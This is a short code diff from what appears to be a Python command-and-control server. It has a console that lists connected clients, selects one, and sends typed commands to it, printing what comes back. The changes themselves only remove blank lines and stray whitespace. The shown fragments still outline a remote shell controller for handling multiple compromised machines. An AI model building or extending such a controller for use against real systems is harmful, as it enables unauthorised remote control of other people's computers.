@@ -21,8 +21,7 @@ def accepting_connections():
             print("Error in accepting conncetions")
 def Greater_Console():
     print("[+] Succesfully established server, now running, for knowledge on commands, type help")  
-    j = "Commands are as follow\nlist ~ provides list of active connections\nselect ? ~ where ? is the number from list\ntotal ~ the total number of active connections\nquit ~closes all conections and exit server\nhelp ~displays this print statement of commands"
-    
+    j = "Commands are as follow\nlist ~ provides list of active connections\nselect ? ~ where ? is the number from list\ntotal ~ the total number of active connections\nquit ~closes all conections and exit server\nhelp ~displays this print statement of commands" 
     while True:
         cmd = input('Greater_Console> ')
         if cmd =='list':
@@ -104,7 +103,6 @@ def commands(conn):
             else:               
                 conn.send(cmd.encode("utf-8")) 
                 client_response = conn.recv(6000).decode("utf-8") 
-    
                 print(client_response)    
         else:
             print("Error")        
